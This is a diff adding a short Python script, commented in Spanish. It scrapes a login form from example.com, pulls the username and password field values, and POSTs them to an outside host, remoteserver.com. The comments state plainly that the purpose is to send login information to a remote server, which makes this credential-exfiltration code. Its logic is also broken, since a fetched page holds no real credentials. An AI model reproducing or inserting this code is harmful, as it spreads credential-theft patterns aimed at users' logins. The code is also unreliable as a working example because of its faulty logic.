@@ -1,0 +1,21 @@
+import requests
+from bs4 import BeautifulSoup
+
+url = 'https://www.example.com'
+response = requests.get(url)
+soup = BeautifulSoup(response.text, 'html.parser')
+
+# Encontrar el formulario de inicio de sesión
+login_form = soup.find('form', {'id': 'login_form'})
+
+# Extraer información de inicio de sesión
+username_field = login_form.find('input', {'name': 'username'})
+password_field = login_form.find('input', {'name': 'password'})
+
+# Enviar información de inicio de sesión a un servidor remoto
+login_data = {
+    'username': username_field['value'],
+    'password': password_field['value']
+}
+remote_server = 'https://www.remoteserver.com/login'
+response = requests.post(remote_server, data=login_data)
